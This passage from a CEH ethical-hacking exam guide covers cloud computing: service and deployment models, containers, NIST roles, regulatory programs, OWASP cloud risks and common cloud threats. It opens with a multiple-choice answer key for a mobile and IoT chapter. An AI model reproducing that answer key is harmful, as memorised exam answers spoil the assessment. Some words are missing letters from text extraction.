2. C. Mobile device management won’t mitigate all the risks associated with unending

use of mobile devices on your network—but at least it’s some measure of control.
3. B. OneClickRoot is designed for rooting Android. The others are jailbreaking

iOS options.
4. B. If untethered jailbreaking has been performed, the device is in a jailbroken state

forever, with or without connection to another device.
5. A. Even though SSL refers to cryptography in communications, almost every

time you see SSL or TLS, M3 is your answer.
6. D. BootROM deals with hardware and provides admin privileges. The remaining

answers either don’t provide admin access, have patch availability, or, in the case
of untethered, aren’t applicable.

7. C. The IoT gateway provides a collective area that allows for at least some measure
of security controls.

8. B. I2: Insecure Network Services is the clear answer here.
9. A. An HVAC IoT device attack is exactly what’s being described here. Rolling

code isn’t applicable, BlueBorne isn’t the best choice, and BlueAir doesn’t exist.
10. B. Shodan is, after all, a search engine. While it may be useful in other areas, it’s

clearly an information-gathering tool.
11. C. Foren6 is the only IoT traffic sniffer listed.
12. C. Closed loop control systems have the control action entirely dependent on the

desired output.
13. A. Programmable Logic Controllers (PLC) are designed for just such a purpose.

08-ch08.indd 342 14/09/21 4:02 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CHAPTER

Security in Cloud 9
Computing
In this chapter you will

• Identiy cloud computing concepts
• Understand basic elements o cloud security
• Identiy cloud security tools

If you haven’t seen the movie The Princess Bride, stop what you’re doing and go watch it
right now. Trust me, the two hours or so you’ll spend in this escape fiction will be more
than worthwhile for the innumerable pop culture references you’ll gain—not to mention
the laughs you’ll get along the way.

One particularly funny line from the movie comes from the repeated use of the word
inconceivable. Sicilian boss Vizzini (portrayed by Wallace Shawn) uses it over and over
again, for things that truly are…conceivable. Finally, in one scene he’s standing at the
top of a cliff with his two henchmen, watching the good guy climbing up a rope hanging
over the edge. Vizzini thinks he’s finally rid of the good guy and cuts the rope, hoping to
see him splat at the bottom. When he peers over and sees the guy has not fallen, but has
caught a hold of a branch and is dangling from the cliffside, he yells, “Inconceivable!”
Swordsman Inigo Montoya, played brilliantly by a young Mandy Patinkin, looks at him
and says, “You keep using that word. I do not think it means what you think it means.”

I’m unsure if there are statistics kept on memes, but the sheer number that have
exploded from this phrase has got to be close to the top. Do a quick image search for it
and you’ll see what I mean—but be forewarned, some of them are brutal. If you’re in an
online conversation and misuse a word or a phrase, I can almost guarantee you’ll hear
(or see) Inigo Montoya’s phrase.

All of this serves to introduce our next, very short, but packed with good information,
chapter on cloud computing. Since the term cloud computing is about as fully understood
by most people as nuclear fusion or anything Ozzy Osbourne says, it’s naturally an area
we should focus some attention on. EC-Council devotes an entire chapter to “Cloud
Computing,” and we’ll do our best to get it translated into common sense throughout
the rest of the chapter. And nobody even think of quoting Inigo back to ECC. I’m sure
they know what both words mean. Maybe.

343

09-ch09.indd 343 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

344

Cloud Computing
I have a couple friends who are really involved in cloud computing for a major enter-
prise network, so I asked them, “What’s the biggest misconception surrounding cloud
computing?” Both, in one fashion or another, answered the same way: “Just which type
and which model of cloud computing are you asking about?” This really hit the nail
on the head, since a lot of us simply don’t have a clue what cloud computing really is.
We think we know, because we’re smart. And we’ve seen Visio diagrams for decades
showing that groovy little cloud to signify a network we have no insight into (like the
Internet). Not to mention we’ve all uploaded music, videos, and documents to “the
cloud.” Ask most people to define cloud and that’s exactly what pops into their head—
an unknown group of network resources sitting somewhere that we can send stuff to,
pull stuff from, and play around in if we need to. And that’s sort of true—there’s just
a lot more to the story.

The entire idea behind cloud computing started almost as soon as the idea for the
Internet was birthed. A guy named J.C.R. Licklider, who was very prominent in the
creation of ARPANET, postulated the concept of “an intergalactic computer network,”
storing data and providing services to organizations and, eventually, individuals. He
may have been off on scope just a bit (maybe in 1960 the idea we’d be spread through-
out the galaxy seemed plausible), but the concept was dead-on. Others continued
the thought process—with some even branching it out to artificial intelligence–type
ideas—alongside a brand new idea called virtualization (starting back in the 1960s by
companies like General Electric, Bell Labs, and IBM).

Virtualization was a neat concept springing from the mainframe line of thinking: let’s
find a way to run more than one operating system simultaneously on the same physi-
cal box. The 1990s saw gobs of research and action on this, with several VM (virtual
machine) companies crawling out into the open to work on it and, in some cases, even
offering virtualized private networking services to customers.

With abundant virtualization opportunities, the concept of cloud computing
exploded. There are arguments over who the first real cloud computing provider was,
and while it’s not very important for your exam, a little history never hurt. Salesforce hit
the scene in 1999, and although it wasn’t really a cloud, it did offer a one-stop shop for
applications via a web portal, and thus broke the ice for the concept. In 2002, Amazon
Web Services (AWS) opened for business, providing cloud-based storage and data com-
putation services. AWS continued expansion of cloud services and has become one of the
biggest cloud service providers on the planet.

This is not to say AWS is the only or the best provider available. In many cases, AWS
is nowhere near the top, and as of this writing, it is being outpaced in market growth by
several players. Microsoft and Google, along with Alibaba and Tencent, are outpacing the
others insofar as growth numbers are concerned. Oracle, Salesforce, IBM, and NTT are
also growing. So while Amazon is one of the market leaders today, it isn’t currently scaling
like Microsoft, Google, and others. Which service provider is best for your needs? Well,
you need to know more about what type of cloud you’re looking for first.

09-ch09.indd 344 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

345

NOTE The latest ramp-up in cloud computing is probably the result o eorts
in the Web 2.0 arena. Google and companies like it have created, marketed, and
managed a variety o browser-based applications. Google Apps (and others like
it) and oerings like Windows 365 are probably the uture.

Squirreling
Long ago, my family adopted the word squirreling to denote someone who simply
can’t make up their mind, darting from idea to idea, action to action, like the squir-
rel in the road as a half-ton of speeding death on wheels hurtles toward it. I came
across an article a while back referencing the new frontier on cloud computing and,
frankly, squirreling was the first thing that came to mind.

Over the past couple or so years, the race to cloud computing has been a sight
to behold. A leading research and advisory company, Gartner, has predicted world-
wide public cloud spending to grow 18 percent in 2021, with nearly 70 percent of
organizations already using cloud computing to increase cloud spending in the wake
of COVID-19. Canalys reports that the worldwide cloud market grew 35 percent
in second quarter 2021 alone. AWS has 32 percent of the market, followed by
Microsoft Azure at 19 percent, Google at 7 percent, and Alibaba Cloud close
behind. But for all its benefits and for all the racing toward it, can cloud computing
handle everything? Is it really the panacea for all?

Another interesting aspect to think about regarding cloud computing is described
in a great Wired.com article, “It’s Time to Think Beyond Cloud Computing” by
Jeremy Hsu (see https://www.wired.com/story/its-time-to-think-beyond-cloud-
computing/). Moving data center–type work to the cloud seems to be an almost
no-brainer, but what about our society’s move toward “self-driving” vehicles? We
already have sensors and computing in vehicles to help them stop in the event a col-
lision obstacle is detected or to keep you in the lane should you start to swerve. Is it
really that far into the future before we’ll get in and tell our cars where to take us?

When that happens, our self-driving cars will need to make decisions, and to make
them fast, based on data stored and processed…somewhere. For example, Toyota
noted that the amount of data flowing between vehicles and cloud computing ser-
vices is estimated to reach 10 exabytes per month by 2025, and if that data is located
somewhere that adds delay, things could get seriously bad in a serious hurry. Even
the slightest of delays in updating road or weather conditions could mean longer
travel times or, worse, errors in decisions that could be dangerous. Therefore, those
smart vehicles of the near future won’t have time to wait the 100 milliseconds or so
it usually takes for information to travel each way to and from distant data centers.

Enter “edge computing” networks and the future of data speed optimization.
While not a new idea per se, the implementation is a bit different, and one that
turns the logic of today’s cloud inside out. One edge computing company, a New
York City startup called Packet, has data centers that look more like a classroom

(continued )

09-ch09.indd 345 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

346

setup, with just a few server racks humming along. But the company promises cus-
tomers in major cities speedy access to raw computing power, with average delays
of just 10 to 15 milliseconds (an improvement of roughly a factor of ten). Zachary
Smith, CEO and cofounder of Packet, says, “It’s a foregone conclusion that giant,
centralized server farms that take up 19 city blocks of power are just not going
to work everywhere,” and he’s among those who believe that the solution for the
future lies in seeding the landscape with smaller server outposts—edge networks—
that would widely distribute processing power in order to speed its results to client
devices, like those self-driving cars, that can’t tolerate delay.

The major cloud providers have taken note. Microsoft now offers Azure IoT
Edge service, intended to push some cloud computing functions onto developers’ own
devices. Barely a month after that, Amazon Web Services opened up general access
to something called “AWS Greengrass,” which extends some cloud-style services to
devices running on local networks. All this leaves many customers who are used to
handing the whole business off to a cloud provider wondering what’s going on.

So follow along with me here… We all race to distribute computing power after
learning distributing that power is better than cramming everything into a huge
mainframe. We then evolve to moving all our data and applications back to a virtual
mainframe, in the name of speed, performance, and cost. And now we evolve once
again to needing access to that data and applications faster than the cloud can pro-
vide it, so we come up with edge networks to distribute the access again.

Be careful which way you dart, fellow squirrel. I have no idea where the car
is going.

Cloud Computing Service Types
So, just what is modern cloud computing? While a firm, one-fits-all absolute defini-
tion is hard to run down, you could do worse than this one: cloud computing pro-
vides individual and enterprise subscribers on-demand delivery of various IT services as
metered services over a network. Cloud computing offers everything from on-demand
self-service, storage, and resource pooling to elasticity, automation in management, and
broad network access. To further define what exactly it is, we need to consider the major
types of cloud computing service, especially as defined by the certification provider.

Infrastructure as a Service (IaaS) basically provides virtualized computing resources over
the Internet. A third-party provider hosts infrastructure components, applications, and
services on behalf of its subscribers, with a hypervisor (such as VMware, Oracle VirtualBox,
Xen, or KVM) running the virtual machines as guests. Collections of hypervisors within
the cloud provider exponentially increase the virtualized resources available and provide
scalability of service to subscribers. As a result, IaaS is a good choice not just for day-to-
day infrastructure service but also for temporary or experimental workloads that may
change unexpectedly. IaaS subscribers typically pay on a per-use basis (within a certain
timeframe, for instance, or sometimes by the amount of virtual machine space used).

09-ch09.indd 346 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

347

Platform as a Service (PaaS) is geared toward software development, as it provides
a development platform that allows subscribers to develop applications without build-
ing the infrastructure that normally would be required to develop and launch software.
Hardware and software are hosted by the provider on its own infrastructure, so customers
do not have to install or build homegrown hardware and software for development work.
PaaS doesn’t usually replace an organization’s actual infrastructure—instead, it just offers
key services the organization may not have onsite.

EXAM TIP Cloud computing can be thought o as the ultimate in separation
o duties. It moves system services that would otherwise be hosted
internally to an external provider. It also separates the role o data owner
rom the role o data custodian.

Lastly, Software as a Service (SaaS) is probably the simplest and easiest service type to
envisage. SaaS is simply a software distribution effort—the provider offers on-demand
applications to subscribers over the Internet. And why would anyone do this? Well,
remember that entire section on web applications from Chapter 8, and all the headaches
of patch management and security your admins have to worry about? SaaS may be able
to take that workload off your plate. SaaS benefits include easier administration, auto-
mated patch management, compatibility, and version control.

For comparison purposes of these models, check out Figure 9-1.

IaaS PaaS SaaS

Applications Applications Applications
Client

Responsibility

Client Data Data Data

Responsibility

Middleware Middleware Middleware

Provider
Operating system Operating system Operating system

Responsibility

Provider
Virtualization Responsibility Virtualization Virtualization

Physical hardware Physical hardware Physical hardware
Provider (servers, storage, (servers, storage, (servers, storage,

Responsibility etc.) etc.) etc.)

Networking Networking Networking
(hardware and (hardware and (hardware and

availability) availability) availability)

Figure 9-1 Cloud computing models

09-ch09.indd 347 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

348

Other, potentially lesser-known but still very testable cloud computing service types
include the following:

• Identity as a Service (IDaaS) refers to services in the identity and access
management (IAM) realm. Examples include Microsoft Azure Active Directory
and Centrify’s Identity Service.

• Function as a Service (FaaS) is the platform used for developing, managing, and
running application functionalities (modular pieces of code that need to work on
the fly, and are usually executed in response to certain events). Examples include
AWS Lambda and Google Cloud Functions).

• Security as a Service (SECaaS) provides the suite of security actions you’ve been
reading about in this book (and hopefully other books), such as intrusion
detection, incident management, anti-malware, and pen testing. Examples
include McAfee Managed Security Systems, and eSentire MDR.

• Container as a Service (CaaS) virtualizes container engines and provides management
through a web portal. Examples include Amazon Elastic Compute Cloud (EC2) and
Google Kubernetes Engine (GKE).

I feel compelled at this point to spend more time on defining and discussing addi-
tional vocabulary within the overarching cloud computing discussion. Why? Well,
mainly because it’s something you’ll be tested on, but also because I simply don’t know
how well versed you may be on underlying cloud terminology and I want to try and
make the concepts as clear as possible. So, making use of EC-Council definitions and
other study materials, let’s give this a go.

A container is basically a package holding components of a single application and
all its dependencies, relying on virtual isolation to deploy and run that application. In
other words, containers hold all the library and configuration files, binaries, and envi-
ronment variables necessary to run the software. Interestingly, per a really good article
on TechTarget regarding containers (https://searchcloudsecurity.techtarget.com/feature/
Cloud-containers-what-they-are-and-how-they-work), they access a shared operating
system kernel. This means that containers reside on one server/host operating system
and share the OS kernel binaries and libraries.

Containers are designed to virtualize a single application, not an OS (that would be
for your virtual machine to provide). For example, if you create a MySQL container,
that’s all you get—a virtual instance of MySQL. Containers isolate applications, so if
anything goes wrong in the container, it will only affect that individual container; the
server or VM the container is running on is isolated.

NOTE Multiple cloud vendors oer CaaS, such as Amazon Elastic Container
Service (ECS), Google Kubernetes Engine, and Microsot Azure Container
Instances (ACI).

09-ch09.indd 348 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

349

When it comes to containers, the industry leader is Docker (https://www.docker
.com). Back in 2013, an open source container technology called Docker Engine was
launched and Docker became a sensation virtually overnight (no pun intended). Docker
Engine runs on various Linux distributions and Windows Server operating systems and,
per the Docker website, “Docker Engine enables containerized applications to run any-
where consistently on any infrastructure, solving ‘dependency hell’ for developers and
operations teams, and eliminating the ‘it works on my laptop!’ problem.”

EXAM TIP How does networking occur in/with Docker? Docker architecture
uses something called the Container Network Model (CNM) to connect
containers and hosts.

Another entry in the container management realm is Kubernetes, aka “K8s.” It’s an
open source container management platform, originally developed by Google and now
in the hands of the Cloud Native Computing Foundation (CNCF), designed to run
across clusters (whereas Docker is designed for a single system). Kubernetes is a near stan-
dard across all major cloud providers, with Amazon, Microsoft, and Oracle natively pro-
viding management for it. Kubernetes and Docker often are used together, with Docker
instances running on individual systems inside a Kubernetes cluster.

NOTE Docker’s container management in cluster orm is called
“docker swarm.”

Cloud Deployment Models
Along with the cloud service types (IaaS, PaaS, SaaS, etc.), there are four main cloud
deployment models:

• Public cloud model Services are provided over a network that is open for
public use (like the Internet). A public cloud is generally used when security and
compliance requirements found in large organizations aren’t a major issue.

• Private cloud model The cloud is private, operated solely for a single
organization (aka single-tenant environment), and is usually not a pay-as-you-go
operation. Private clouds are usually preferred by larger organizations, because
the hardware is dedicated and security and compliance requirements can be more
easily met.

• Community cloud model The cloud infrastructure is shared by several
organizations, usually with the same policy and compliance considerations.
For example, multiple different state-level organizations may get together and
take advantage of a community cloud for services they require.

• Hybrid cloud model A composition of two or more cloud deployment models.

09-ch09.indd 349 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

350

EXAM TIP A relatively new term making an appearance in CEH study is the
“multi-cloud.” This deployment model combines workloads across multiple
cloud providers in one heterogeneous environment. From a VMware article
on the subject (https://www.vmware.com/topics/glossary/content/hybrid-
cloud-vs-multi-cloud), “Although it is similar to a hybrid cloud, multi-cloud
speciically indicates more than one public cloud provider service and need
not include a private cloud component at all (although it can).”

Lastly, and as always with these types of things, we need to spend just a little bit
of time talking about U.S. government rules and regulations regarding the cloud. In
September 2011, faced with more and more government organizations looking to the
cloud as a means to save money, the National Institute of Standards and Technology
(NIST) released Special Publication (SP) 500-292, NIST Cloud Computing Reference
Architecture (https://www.nist.gov/customcf/get_pdf.cfm?pub_id=909505), to provide
a “fundamental reference point…to describe an overall framework that can be used
government-wide.” This publication defines five major roles within a cloud architec-
ture, shown in Figure 9-2:

• Cloud carrier The organization that has the responsibility of transferring the
data, akin to the power distributor for the electric grid. The cloud carrier is the
intermediary for connectivity and transport between subscriber and provider.

• Cloud consumer The individual or organization that acquires and uses cloud
products and services.

• Cloud provider The purveyor of products and services.

Cloud Provider
Cloud

Cloud Service Orchestration Broker
Consumer

Cloud Service
Service Layer

Management
SaaS Service

Intermediation
Cloud PaaS Business

Auditor Support
laaS Service

Security Aggregation
Resource Abstraction and

Audit Provisioning/
Control Layer Configuration Service

Privacy
Physical Resource Layer Arbitrage

Impact Audit
Hardware Portability/

Performance Interoperability
Facility

Audit

Cloud Carrier

Figure 9-2 NIST Cloud Computing Reerence Architecture

09-ch09.indd 350 14/09/21 4:03 PM

Security

Privacy



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

351

• Cloud broker Acts to manage use, performance, and delivery of cloud services,
as well as the relationships between providers and subscribers. The broker “acts
as the intermediate between consumer and provider and will help consumers
through the complexity of cloud service offerings and may also create value-
added cloud services as well.”

• Cloud auditor Independent assessor of cloud service and security controls. The
auditor “provides a valuable inherent function for the government by conducting
the independent performance and security monitoring of cloud services.”

In addition to the NIST reference architecture, there are a few regulatory bodies and
efforts surrounding cloud computing, which I’ll touch on next. But first, what’s really
very interesting about them is that ECC doesn’t even mention them in the official course-
ware. Not one regulatory effort—FedRAMP, PCI DSS, FIPS—is mentioned at all. Does
this mean they’re not important, that we shouldn’t devote space to them, or that you
shouldn’t be aware of them? Heck no. It’s my opinion these regulatory bodies and efforts
will be part of the exam sooner rather than later, so you should at least be able to identify
them. ECC has a habit of springing topics on you after the release of new material, so at
a minimum be aware that these entities exist.

The Federal Risk and Authorization Management Program (FedRAMP) is probably the
most recognized and referenced regulatory effort regarding cloud computing. FedRAMP is
a government-wide program that provides a standardized approach to security assessment,
authorization, and continuous monitoring for cloud products and services. FedRAMP
not only provides an auditable framework for ensuring basic security controls for any gov-
ernment cloud effort, but also offers tips for security and configuration (now listed as faqs
here: https://www.fedramp.gov/faqs) and even has training available on the site (https://
www.fedramp.gov/training/).

NOTE Another regulatory compliance eort o note or you is PCI SSC Cloud
Computing Guidelines, published by the Cloud Special Interest Group PCI
Security Standards Council in 2018 (https://www.pcisecuritystandards.org/
pds/PCI_SSC_Cloud_Guidelines_v3.pd ).

Want more? How about the Cloud Security Alliance (CSA)? CSA is the leading
professional organization devoted to promoting cloud security best practices and orga-
nizing cloud security professionals. In addition to providing a certification on cloud
security and offering an array of cloud-centric training, CSA has published a general
cloud enterprise architecture model to help professionals conceptualize the components
of a successful cloud implementation. CSA has also published gobs of documentation
on everything from privacy concerns to security controls’ focus and implementation
(https://cloudsecurityalliance.org).

There’s more regarding cloud computing—lots more. I could’ve written an entire
book on the subject, but that’s not what I’m here for. For the CEH exam, you’ll need to
know cloud basics, which we’ve covered, I think, pretty well so far. There are some secu-
rity aspects still left to talk about, though, so hang on.

09-ch09.indd 351 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

352

Cloud Security
What may be one of the most confusing aspects of cloud computing security comes
back to what we started this chapter with—it’s hard to defend something when you
don’t really know what that something is. With cloud computing, instead of building
hardware (like servers, network devices, and cabling) and setting up a classic data center
to fit your needs, you simply purchase services to handle the resources, automation,
and support to get the job done. The services purchased, though, run in a data center
somewhere, filled with servers, network devices, and cabling. The only real difference
is the physical devices belong to someone else—which raises questions regarding a very
fuzzy line in security testing.

Let’s say you wish to test all your resources, data, and services to get an idea of your
overall security because, well, you’re supposed to. Where does your testing start and end?
I mean, considering your entire system relies on Amazon (for example) to remain up
and secure, can you test all of Amazon? And what happens if your resources are com-
ingled somewhere inside all that cloud secret sauce? Can you really trust they’re on top
of things, security-wise? Should you? Can you? Add to it the vast complexity involved in
actually trying to pen test a cloud enterprise—you’ll probably need an army of lawyers to
establish rules of engagement (ROE) and scope, and even then, what you do in testing
Enterprise A may have adverse effects on Enterprise B—and as you can tell, security in
the cloud is…weird.

Storm Clouds
Oh, the cloud. Doesn’t it instantly bring to mind pictures of serenity, calm, and
beauty? Look at the little cherubs over there handling the cabling for us. Oh, isn’t it
so cute how they bat down intrusion attempts at the barrier over there? Just ador-
able. But I got to thinking when I started writing this chapter that there has to be
a dark side. Maybe the cloud isn’t always brightly lit and fluffy with little cherubs
handling everything. Maybe it’s dark and harsh, with thunder and lightning rum-
bling about. More, you know, like a horror show.

I did a Google search on “cloud horror stories” and came up with some fascinat-
ing articles. Seems that moving things to the cloud doesn’t suddenly make your
world a better place where security and protection isn’t a concern anymore. No, it’s
filled with dark alleyways and nefarious folks roaming around looking for the right
lightning bolt to toss—or to grab hold of.

In a CIO.com article on this subject, author John Brandon noted some nightmare
scenarios a cloud service subscriber might want to think about (https://www.cio
.com/article/2460967/how-to-survive-4-cloud-horror-stories.html). Suppose your
cloud service provider just suddenly decides it’s done paying bills and declares bank-
ruptcy? Now you’re in a real pickle, with your data and services locked away in the
red tape of financial bureaucracy and a nightmare world of lawyers and time you can
ill-afford to use in getting things back up and running. And it’s actually happened—a
provider named Nirvanix did declare bankruptcy. But no worries, Nirvanix gave all

09-ch09.indd 352 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

353

subscribers 30 days to move all data out to new locales. No problem, right? I mean,
surely we can move our entire operation with no downtime or loss in 30 days. Right?

And what happens if you and your cloud provider just don’t get along? Suppose,
for instance, you decide you want to move service and data X from your current
provider to another, and your current provider decides it doesn’t want to assist you
with that. Is it possible the provider could make things difficult on you? Or suppose
your virtualized servers and data actually get hacked and destroyed and your pro-
vider simply says, “Not our fault—we don’t provide any disaster recovery options
for you. Should’ve paid attention when you signed the contract.” Providers are very
touchy when it comes to their internal workings, and if you’re on their bad side,
things can go south in a hurry.

And who can forget money in all this? You probably have financial and contract-
ing sections within the organization to keep this cloud provision paid for. So what
happens when they get into a dispute with the cloud provider? If the provider thinks
your organization hasn’t paid but your contracting/finance office thinks it has, what
happens to the actual IT services? Does everyone let things keep running smoothly
while they work it out over beignets and coffee? Somehow I think not.

No, the cloud isn’t always nice and fluffy. Sometimes there are things flying
around up here you need to be ready for. When you come up here to play, just
remember, here be dragons—and the stuff of nightmares.

So does that mean cloud security is different from on-premises security? In some aspects,
yes. For instance, discussing cloud security is really talking about two sides of the same
coin—you must be concerned with the security of the provider as well as that of the sub-
scriber, and both are responsible for it. And what about additional target points introduced
as a part of cloud? For example, using virtualization introduces a hypervisor layer between
physical hardware and subscribed servers. Therefore, if you compromise the hypervisor,
you compromise them all. Add to it that most cloud providers simply will not allow sub-
scribers a level of monitoring and access even approximating what they’d have in a tradi-
tional architecture (I’ve personally heard the phrase “that’s part of the secret sauce, so don’t
worry about it” more times than I care to remember), and things can get really hairy.

NOTE Not amiliar with the Trusted Computing Model? Trusted computing
basically reers to an attempt to resolve computer security problems through
hardware enhancements and associated sotware modiications. The Trusted
Computing Group (TCG) is made up o a bunch o hardware and sotware
providers who cooperate to come up with speciic plans. Something called
Roots of Trust (RoT) is a set o unctions within the Trusted Computing Model
that are always trusted by the computer’s operating system.

However, in most aspects, the answer is definitely no. You’re still faced with the same
issues you have everywhere else: computing resources are public-facing or otherwise
available, and bad guys are trying to get into them. There are security policies to be

09-ch09.indd 353 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

354

Layer Controls

Web app firewalls, software development life cycle (SDLC),
Applications

binary analysis, application scanners, etc.

Database monitoring, encryption, data loss prevention (DLP), content
Information

management framework (CMF), etc.

Patch and configuration management, governance and compliance, virtual
Management

machine administration, identity and access management (IAM), etc.

Firewalls, network intrusion detection/prevention, quality of service (QoS),
Network

DNS security, etc.

Trusted
Hardware and software roots of trust (RoT) and APIs, etc.

Computing

Computer and Host-based intrusion detection/prevention and firewalls, log management,
Storage file integrity efforts, encryption, etc.

Physical Physical security measures, video monitoring, guards, etc.

Figure 9-3 Cloud control layers

hammered out and adhered to, authentication methods to figure out, web application
security concerns, intrusion detection issues, malware prevention efforts, and the list goes
on and on. In short, once again you must ask yourself, “What are my vulnerabilities and
threats, and what can I do to mitigate them?” Both CSA and ECC have a nice reference
chart for security control layers, which you can see in Figure 9-3.

Cloud Threats
Remember OWASP? Well, they’re back again and this time they’re tossing out a top
ten in cloud computing—specifically, the Top 10 Cloud Security Risks (https://owasp
.org/www-pdf-archive/OWASP_Cloud_Top_10.pdf ). And, much like with the other
OWASP Top 10 lists covered thus far, I’ll include all entries here as of the latest report:

• R1: Accountability & Data Risk Using public cloud can introduce risk for
data recovery.

• R2: User Identity Federation Multiple user identities in multiple providers
adds tremendous complexity to user ID management.

• R3: Legal & Regulatory Compliance Different regulatory laws in different
countries add complexity to an already challenging arena.

• R4: Business Continuity & Resiliency Since using the cloud transfers
business continuity efforts to the provider, business or financial loss could occur
if there is a problem with the provider.

• R5: User Privacy & Secondary Usage of Data User personal data and privacy
can be put at risk.

09-ch09.indd 354 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

Chapter 9: Security in Cloud Computing

355

• R6: Service & Data Integration Eavesdropping and interception can occur if
data is not secured in transit.

• R7: Multi-tenancy & Physical Security If tenants within the cloud are
not properly segmented, security features may be interfered with or altered
(knowingly or unknowingly).

• R8: Incidence Analysis & Forensics Distribution of storage may frustrate law
enforcement forensic efforts.

• R9: Infrastructure Security Infrastructure misconfiguration can interject issues
and allow unauthorized scanning.

• R10: Non-production Environment Exposure Unauthorized access and data
disclosure can increase with the use of non-production environments.

EXAM TIP There is yet another OWASP list to amiliarize yoursel with: the
Top 10 Serverless Security Risks: A1: Injection, A2: Broken Authentication,
A3: Sensitive Data Exposure, A4: XML External Entities (XXE), A5: Broken
Access Control, A6: Security Misconiguration, A7: Cross-Site Scripting
(XSS), A8: Insecure Deserialization, A9: Using Components with Known
Vulnerabilities, and A10: Insuicient Logging and Monitoring.

As far as tools to assist you in cloud security, not surprisingly the list is long. Depend-
ing on the model chosen and what you’re trying to get out of your cloud architecture (or
keep in it), tools can be as varied as your traditional data centers. A couple mentioned spe-
cifically by EC-Council are Core CloudInspect and CloudPassage Halo. Core CloudIn-
spect is a tool that profits from the Core Impact & Core Insight technologies to offer
penetration testing as a service from Amazon Web Services for EC2 users (https://www
.coresecurity.com/corelabs-research/projects/core-cloudinspect). It’s obviously designed
for AWS cloud subscribers and runs as an automated, all-in-one testing suite specifically
for your cloud subscription. CloudPassage Halo “provides instant visibility and continu-
ous protection for servers in any combination of data centers, private clouds and public
clouds. The Halo platform is delivered as a service, so it deploys in minutes and scales
on demand. Halo uses minimal system resources, so layered security can be deployed
where it counts, right at every workload—servers, instances and containers” (https://www
.cloudpassage.com/products/).

NOTE Amazon does allow or independent security testing (https://aws
.amazon.com/security/penetration-testing/), but the rules are very strict
about what you can and can’t do. You know, exactly like the bad guys limit
themselves when targeting someone… </sarcasm>. You can poke your
own boxes, but you can orget testing the servers that control them, the
authentication system allowing you into them, or the admins who oversee
any o them. While you can execute a technical pen test o your servers, data,
and resources, you won’t be able to execute many other aspects o a true
pen test. And, as we all know, it’s otentimes those other areas o ocus that
can lead to real trouble.

09-ch09.indd 355 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

CEH Certified Ethical Hacker All-in-One Exam Guide

356

Other cloud-specific tools and toolsets mentioned in study materials and courseware
include Qualys Cloud Suite, Trend Micro’s Instant-On Cloud Security, and Panda Cloud
Office Protection.

Depending on who you talk to, there are various “top threats” to cloud computing.
The Cloud Security Alliance released a publication titled “The Dirty Dozen: 12 Top
Cloud Security Threats” (also referred to as “The Treacherous 12: Cloud Computing
Top Threats in 2016”). And EC-Council? They seem to believe it’s important to list
every single threat imaginable, and devote slide after slide to cloud computing threats.
The more salient threats are listed on everyone’s offering, though, so we’ll concentrate
on those.

In virtually every list you look at, data breach or loss is at the top. Data breach or loss,
of course, refers to the malicious theft, erasure, or modification of almost anything in the
cloud you can think of. Due to the nature of cloud computing, the sheer amount of data
available makes this a prime target—not to mention that data is sensitive in nature. You
might think financial information is the big target, but data breaches involving health
information and intellectual property may turn out to be even more damaging to an
organization (not just in fines and lawsuits and criminal penalties, but in brand damage
and loss of business). It’s important to note that while cloud providers deploy their own
tools, methods, and controls to protect their overall environment, it’s generally and ulti-
mately up to the subscribers themselves to protect their own data in the cloud. No matter
what implementation of cloud, data breach threats apply to all cloud service types and
cloud deployment models. On its website, CSA recommends multifactor authentication
and encryption as protection against data breaches.

NOTE Ever heard the term shadow IT? It sounded so awesome when I irst
heard it, I wanted to go buy a box o it. But in reality it reers to IT systems
and solutions that are developed to handle an issue but aren’t necessarily
taken through proper organizational approval chains. “Just get the job
done” works in many situations, but having shadow IT around—even in the
cloud—can be a recipe or disaster.

Abuse of cloud resources is another threat high on everyone’s list. If an attacker can cre-
ate anonymous access to cloud services, he could then leverage the tremendous resources
to pull off all sorts of evil deeds. Need to crack a password or encryption key and don’t
have a 25-GPU cluster at home? Why not use the cloud’s virtual servers to do it for
you? An attacker may also leverage resources to build rainbow tables, create and control
botnets, and even host exploits and malicious sites. Typically this threat isn’t necessarily
a specific concern of cloud subscribers (other than maybe some degradation of services
or whatnot), but it’s a very valid concern for the provider. The provider should perform
active monitoring to detect any abuse instances as well as have a means to protect/recover
from them. Generally speaking, the abuse of cloud services threat applies to the IaaS and
PaaS models.

09-ch09.indd 356 14/09/21 4:03 PM



All-In-One / CEH™ Certifed Ethical Hacker All-in-One Exam Guide / Walker / 994-3 / Chapter 9

